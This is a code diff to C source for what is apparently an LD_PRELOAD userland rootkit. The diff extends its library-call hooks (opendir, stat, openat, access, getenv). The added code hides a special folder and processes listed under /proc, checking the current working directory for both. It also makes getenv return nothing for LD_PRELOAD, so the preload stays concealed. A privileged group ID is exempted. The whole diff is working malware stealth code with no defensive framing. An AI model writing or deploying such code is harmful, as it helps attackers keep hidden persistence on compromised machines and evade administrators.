@@ -67,6 +67,7 @@ int file_check(const char *path) {
     || strstr(path, HIDDEN_PATH) != NULL
     || strstr(path, SPECIAL_PATH) != NULL
     || strstr(path, SPECIAL_FILENAME) != NULL
+    || strstr(path, SPECIAL_FOLDER) != NULL
     || strstr(path, "ld.so.preload") != NULL
     ) {
         return 1;
@@ -336,8 +337,6 @@ int openat(int dirfd, const char *path, int flags, ...) {
 #ifdef VERBOSE
     printf("openat called\n");
 #endif
-    printf("openat called\n");
-
     if(!o_openat)
         o_openat = dlsym(RTLD_NEXT, "openat");
 
@@ -396,6 +395,22 @@ DIR *opendir(const char *name) {
         return o_opendir(name);
     }
 
+    char cwd[1024];
+    getcwd(cwd, sizeof(cwd));
+    if (file_check(cwd) == 1) {
+        errno = ENOENT;
+        return NULL;
+    }
+
+    if (strstr(cwd, "/proc/") != NULL) {
+        // get pid
+        char *pid = strstr(cwd, "/proc/") + 6;
+        if (pid_check(pid) == 1) {
+            errno = ENOENT;
+            return NULL;
+        }
+    }
+
     if (file_check(name) == 1) {
         errno = ENOENT;
         return NULL;
@@ -421,6 +436,22 @@ int stat(const char *pathname, struct stat *statbuf) {
 
     if (good_gid() == 1) {
         return o_stat(pathname, statbuf);
+    }
+
+    char cwd[1024];
+    getcwd(cwd, sizeof(cwd));
+    if (file_check(cwd) == 1) {
+        errno = ENOENT;
+        return -1;
+    }
+
+    if (strstr(cwd, "/proc/") != NULL) {
+        // get pid
+        char *pid = strstr(cwd, "/proc/") + 6;
+        if (pid_check(pid) == 1) {
+            errno = ENOENT;
+            return -1;
+        }
     }
 
     if (file_check(pathname) == 1) {
@@ -461,4 +492,26 @@ int access(const char *pathname, int mode) {
     }
 
     return o_access(pathname, mode);
+}
+
+// getenv
+
+char *(*o_getenv)(const char *);
+char *getenv(const char *name) {
+#ifdef VERBOSE
+    printf("getenv called\n");
+#endif
+    if(!o_getenv)
+        o_getenv = dlsym(RTLD_NEXT, "getenv");
+
+    if (good_gid() == 1) {
+        return o_getenv(name);
+    }
+
+    // hide ld_preload
+    if (strcmp(name, "LD_PRELOAD") == 0) {
+        return NULL;
+    }
+
+    return o_getenv(name);
 }
